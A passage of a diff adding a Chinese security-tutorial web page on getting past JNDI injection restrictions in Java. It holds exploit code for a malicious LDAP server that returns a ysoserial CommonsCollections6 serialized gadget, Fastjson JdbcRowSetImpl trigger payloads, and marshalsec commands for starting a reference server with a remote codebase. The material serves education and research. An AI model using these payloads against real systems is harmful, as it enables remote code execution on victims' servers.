+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Send LDAP reference result for &quot;</span> <span class="o">+</span> <span class="n">base</span> <span class="o">+</span> <span class="s">&quot; redirecting to &quot;</span> <span class="o">+</span> <span class="n">turl</span><span class="o">);</span>
+    <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&quot;javaClassName&quot;</span><span class="o">,</span> <span class="s">&quot;foo&quot;</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">cbstring</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+    <span class="kt">int</span> <span class="n">refPos</span> <span class="o">=</span> <span class="n">cbstring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">&#39;#&#39;</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span> <span class="n">refPos</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">)</span> <span class="o">{</span>
+        <span class="n">cbstring</span> <span class="o">=</span> <span class="n">cbstring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">refPos</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="cm">/** Payload1: Return Evil Reference Factory **/</span>
+    <span class="c1">// e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span>
+    <span class="c1">// e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span>
+    <span class="c1">// e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span>
+
+    <span class="cm">/** Payload2: Return Evil Serialized Gadget **/</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="c1">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;|base64</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&quot;javaSerializedData&quot;</span><span class="o">,</span><span class="n">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="s">&quot;rO0ABXNyABFqYXZhLn.....&quot;</span><span class="o">));</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParseException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+    <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+<span class="o">}</span>
+<span class="o">...</span>
+</pre></div>
+
+<p>模拟受害者进行JNDI lookup操作，或者使用Fastjson等漏洞模拟触发，即可看到弹计算器的命令被执行。</p>
+<div class="codehilite"><pre><span></span><span class="n">Hashtable</span> <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+<span class="n">Context</span> <span class="n">ctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>
+<span class="n">Object</span> <span class="n">local_obj</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span><span class="o">);</span>
+
+<span class="n">String</span> <span class="n">payload</span> <span class="o">=</span><span class="s">&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; }&quot;</span><span class="o">;</span>
+<span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
+</pre></div>
+
+<p>这种绕过方式需要利用一个本地的反序列化利用链（如CommonsCollections），然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用.</p>
+<h3 id="_1">写在最后<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>实战中可以使用marshalsec方便的启动一个LDAP/RMI Ref Server：</p>
+<div class="codehilite"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">target</span><span class="o">/</span><span class="n">marshalsec</span><span class="o">-</span><span class="mf">0.0.1</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="n">marshalsec</span><span class="o">.</span><span class="na">jndi</span><span class="o">.(</span><span class="n">LDAP</span><span class="o">|</span><span class="n">RMI</span><span class="o">)</span><span class="n">RefServer</span> <span class="o">&lt;</span><span class="n">codebase</span><span class="o">&gt;</span><span class="err">#</span><span class="o">&lt;</span><span class="n">class</span><span class="o">&gt;</span> <span class="o">[&lt;</span><span class="n">port</span><span class="o">&gt;]</span>
+
+<span class="nl">Example:</span>
+
+<span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">target</span><span class="o">/</span><span class="n">marshalsec</span><span class="o">-</span><span class="mf">0.0.1</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="n">marshalsec</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">LDAPRefServer</span> <span class="n">http</span><span class="o">:</span><span class="c1">//8.8.8.8:8090/#Exploit 8088</span>
+</pre></div>
+
+<p>本文内的相关测试代码见Github <a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a></p>
+<p>参考:<a href="https://www.anquanke.com/post/id/194384#h3-3">https://www.anquanke.com/post/id/194384#h3-3</a></p>
+<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
+<p><a href="https://xz.aliyun.com/t/6660">https://xz.aliyun.com/t/6660</a></p>
+<p><a href="https://www.anquanke.com/post/id/87270">https://www.anquanke.com/post/id/87270</a></p>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../1-Java反序列化/" title="Java反序列化介绍" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                Java反序列化介绍
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../vul/Java-XXE漏洞/" title="Java-XXE漏洞" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                Java-XXE漏洞
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/Qclover" class="md-footer-social__link fa fa-github"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.808e90bb.js"></script>
+      
+        
+        
+          
+          <script src="../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../js/extra.js"></script>
+      
+        <script src="../../js/baidu-tongji.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
